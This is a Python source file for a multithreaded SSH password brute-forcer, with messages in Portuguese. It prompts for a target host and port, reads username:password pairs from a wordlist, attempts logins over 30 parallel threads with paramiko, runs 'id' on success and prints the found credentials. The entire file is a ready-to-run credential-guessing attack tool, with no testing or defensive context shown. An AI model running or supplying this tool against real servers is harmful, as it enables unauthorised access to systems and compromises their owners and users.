import os
import sys
import paramiko
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

found_event = threading.Event()
lock = threading.Lock()

# Limpa tela
def cleanscreen():
	if sys.platform == "win32":
		os.system("cls")
	else:
		os.system("clear")

def tentar_login(host, port, username, password):
	if found_event.is_set():
		return
	conexao = paramiko.SSHClient()
	conexao.load_system_host_keys()
	conexao.set_missing_host_key_policy(paramiko.AutoAddPolicy)
	try:
		with lock:
			print(f"\033[1m[\033[m\033[1;36m>\033[m\033[1m]\033[m Tentando com usuário: \033[1;33m{username}\033[m e senha: \033[1;33m{password}\033[m")
		conexao.connect(hostname=host, username=username, password=password, port=int(port), timeout=5)
		stdin, stdout, stderr = conexao.exec_command("id")
		for resp in stdout:
			resposta = resp.replace("\n", "")
			if "shell access is not enabled on your account" in resposta.lower():
				with lock:
					print(f"\n\033[1m[\033[m\033[1;33m*\033[m\033[1m]\033[m Login efetuado com sucesso, mas o usuário \033[1;36m{username}\033[m não tem uma shell!")
			else:
				with lock:
					print("\n\033[1m[\033[m\033[1;32m>\033[m\033[1m]\033[m\033[1;32m CREDENCIAIS ENCONTRADAS:\033[m")
					print(f"\033[1m[\033[m\033[1;32m>\033[m\033[1m]\033[m Hostname: {host}")
					print(f"\033[1m[\033[m\033[1;32m>\033[m\033[1m]\033[m Username: {username}")
					print(f"\033[1m[\033[m\033[1;32m>\033[m\033[1m]\033[m Password: {password}\n")
		found_event.set()
	except paramiko.AuthenticationException:
		pass
	except Exception as e:
		if not found_event.is_set():
			with lock:
				print(f"Erro com {username}:{password} → {e}")
	finally:
		conexao.close()

# Programa principal
cleanscreen()
print("""\033[1;31m
 ____  _                                   _____ _____ _____
|    \|_|___ ___ ___ _ _ ___ ___    ___   |   __|   __|  |  |
|  |  | |_ -|  _| . | | | -_|  _|  |___|  |__   |__   |     |
|____/|_|___|___|___|\_/|___|_|           |_____|_____|__|__|\n
\033[m""")

try:
	host_ip_dns = input("\033[1m[\033[m\033[1;32m+\033[m\033[1m]\033[m Host alvo: ").strip()
	host_tports = input("\033[1m[\033[m\033[1;32m+\033[m\033[1m]\033[m Port host: ").strip()
except KeyboardInterrupt:
	sys.exit()

if host_ip_dns and host_tports:
	try:
		with open("sshpasswdwl.txt", "r") as pwdfile:
			linhas = pwdfile.readlines()
			print(f"\n\033[1;33m[*]\033[m\033[1m Tamanho da wordlist: {len(linhas)}\033[m")
			print("\033[1;33m[*]\033[m\033[1m Status:\033[m\033[1;32m Iniciado!\033[m\n")

			with ThreadPoolExecutor(max_workers=30) as executor:
				futures = []
				for user_pass in linhas:
					if found_event.is_set():
						break
					credenciais = user_pass.strip().split(":")
					if len(credenciais) != 2:
						continue
					username_sh = credenciais[0].strip()
					password_sh = credenciais[1].strip()
					futures.append(executor.submit(tentar_login, host_ip_dns, host_tports, username_sh, password_sh))

				# Aguarda resultados e interrompe cedo se necessário
				for future in as_completed(futures):
					if found_event.is_set():
						break
	except KeyboardInterrupt:
		print("\n\033[1m[\033[m\033[1;31m-\033[m\033[1m]\033[m Interrompido pelo usuário.")
		sys.exit()
else:
	print("\n\033[1m[\033[m\033[1;31m>\033[m\033[1m]\033[m Passe um host e uma porta para se autenticar!\n")
